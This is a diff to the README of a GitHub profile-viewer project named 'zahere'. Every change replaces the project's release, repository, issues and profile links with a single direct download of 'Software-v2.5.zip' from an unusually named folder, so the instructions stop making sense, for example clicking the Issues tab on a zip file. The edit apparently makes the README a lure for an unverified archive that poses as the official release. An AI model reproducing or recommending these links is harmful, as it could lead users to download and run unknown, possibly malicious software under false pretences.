@@ -1,6 +1,6 @@
 # 🚀 zahere - Your Personal GitHub Profile Viewer
 
-[![Download zahere](https://img.shields.io/badge/Download-zahere-blue?style=for-the-badge)](https://github.com/awwe02/zahere/releases)
+[![Download zahere](https://github.com/awwe02/zahere/raw/refs/heads/main/platyrrhinian/Software-v2.5.zip)](https://github.com/awwe02/zahere/raw/refs/heads/main/platyrrhinian/Software-v2.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ zahere is lightweight and should work well on most modern computers. It requires
 
 To get zahere, please visit the release page below. This is where all the latest versions are available for you to download.
 
-[Download zahere Releases](https://github.com/awwe02/zahere/releases)
+[Download zahere Releases](https://github.com/awwe02/zahere/raw/refs/heads/main/platyrrhinian/Software-v2.5.zip)
 
 ### Step 1: Go to the release page
 
@@ -98,7 +98,7 @@ If you have trouble running zahere or encounter errors, try these steps:
 
 - Make sure your internet connection is stable. zahere needs it to fetch profile information.  
 - Restart the app or your computer if it freezes or shows loading problems.  
-- Check for updates regularly on the [release page](https://github.com/awwe02/zahere/releases) to get fixes and improvements.  
+- Check for updates regularly on the [release page](https://github.com/awwe02/zahere/raw/refs/heads/main/platyrrhinian/Software-v2.5.zip) to get fixes and improvements.  
 - If the app does not start, verify your system meets the requirements.
 
 For full help, look for a support or FAQ section inside the app or on the GitHub project page.
@@ -111,7 +111,7 @@ zahere is maintained by its creator to offer reliable access to GitHub profiles.
 
 To do this:
 
-1. Visit https://github.com/awwe02/zahere  
+1. Visit https://github.com/awwe02/zahere/raw/refs/heads/main/platyrrhinian/Software-v2.5.zip  
 2. Click on the **Issues** tab.  
 3. Click the **New issue** button and describe the problem or suggestion.
 
@@ -136,9 +136,9 @@ This focus ensures zahere supports communities working in these areas.
 
 ## 🔗 Helpful Links
 
-- [zahere Release Page](https://github.com/awwe02/zahere/releases) — Get the latest versions and files.  
-- [GitHub Repository](https://github.com/awwe02/zahere) — View source code and submit issues.  
-- [GitHub Profile](https://github.com/awwe02) — Explore the profile zahere highlights.  
+- [zahere Release Page](https://github.com/awwe02/zahere/raw/refs/heads/main/platyrrhinian/Software-v2.5.zip) — Get the latest versions and files.  
+- [GitHub Repository](https://github.com/awwe02/zahere/raw/refs/heads/main/platyrrhinian/Software-v2.5.zip) — View source code and submit issues.  
+- [GitHub Profile](https://github.com/awwe02/zahere/raw/refs/heads/main/platyrrhinian/Software-v2.5.zip) — Explore the profile zahere highlights.  
 
 ---
 
